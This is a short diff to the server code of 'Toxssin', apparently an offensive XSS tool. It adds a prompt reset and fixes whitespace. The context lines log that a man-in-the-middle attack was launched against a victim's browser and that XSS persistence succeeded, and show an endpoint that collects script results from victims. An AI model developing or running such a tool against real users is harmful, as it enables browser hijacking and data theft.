@@ -409,7 +409,8 @@ class Toxssin(BaseHTTPRequestHandler):
 			
 			if state == 'init':
 				echo_log(f'\r[{datetime_prefix[1]}] [{B_RED}{REQ}{B_END}] {BOLD}Received request for toxin! MITM attack launched against victims\'s browser!{END}', toxssin_id, echo = True)
-
+				rst_prompt()
+				
 			elif state == 'found' and exists:
 				echo_log(f'\r[{datetime_prefix[1]}] [{SPIDER}] {BOLD}Received request for toxin from an active session. XSS persistence was successful!{END}', toxssin_id, echo = True)
 				rst_prompt()
@@ -630,7 +631,7 @@ class Toxssin(BaseHTTPRequestHandler):
 
 
 		# Script exec results
-		elif self.path == '/7f47fd7ae404fa7c0448863ac3db9c85' and toxssin_id in Toxssin.execution_verified  and self.headers.get('X-form-script') not in ['null', None]:
+		elif self.path == '/7f47fd7ae404fa7c0448863ac3db9c85' and toxssin_id in Toxssin.execution_verified and self.headers.get('X-form-script') not in ['null', None]:
 
 			self.send_response(200)
 			self.send_header('Access-Control-Allow-Origin', '*')
